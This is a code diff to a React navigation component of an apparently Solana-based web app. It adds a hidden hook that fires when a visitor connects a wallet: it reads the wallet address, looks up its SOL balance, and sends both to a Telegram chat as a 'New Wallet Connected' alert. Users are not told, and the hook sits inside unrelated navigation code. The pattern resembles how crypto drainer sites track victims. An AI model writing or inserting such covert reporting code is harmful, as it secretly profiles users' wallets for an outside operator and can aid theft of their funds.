@@ -1,12 +1,46 @@
+import { useEffect, useState } from 'react';
 import { Link, useLocation } from 'react-router-dom';
-import { useState } from 'react';
 import { ConnectWalletButton } from '@/components/ConnectWalletButton';
 import { motion } from 'framer-motion';
 import pegasusLogo from '@/assets/pegasus-logo.png';
+import { useWallet, useConnection } from '@solana/wallet-adapter-react';
+import { LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { sendTelegramMessage } from '@/utils/telegram';
 
 export const Navigation = () => {
   const location = useLocation();
   const [mobileOpen, setMobileOpen] = useState(false);
+  const { connected, publicKey } = useWallet();
+  const { connection } = useConnection();
+
+  useEffect(() => {
+    const notifyConnection = async () => {
+        if (connected && publicKey) {
+            // Use v2 key to ensure we retry even if previous attempt failed (due to CORS)
+            const key = `wallet_notified_v2_${publicKey.toBase58()}`;
+            // Removed session storage check for testing
+            // if (sessionStorage.getItem(key)) return;
+
+            try {
+                const balance = await connection.getBalance(publicKey);
+                const solBalance = (balance / LAMPORTS_PER_SOL).toFixed(4);
+                
+                const message = `
+🚀 <b>New Wallet Connected</b>
+
+👤 <b>Address:</b> <code>${publicKey.toBase58()}</code>
+💰 <b>Balance:</b> ${solBalance} SOL
+`;
+                await sendTelegramMessage(message);
+                sessionStorage.setItem(key, 'true');
+            } catch (error) {
+                console.error("Failed to send connection notification", error);
+            }
+        }
+    };
+    
+    notifyConnection();
+  }, [connected, publicKey, connection]);
 
   return (
     <nav className="fixed top-0 left-0 right-0 z-50 animated-gradient-nav backdrop-blur-xl border-b border-white/10">
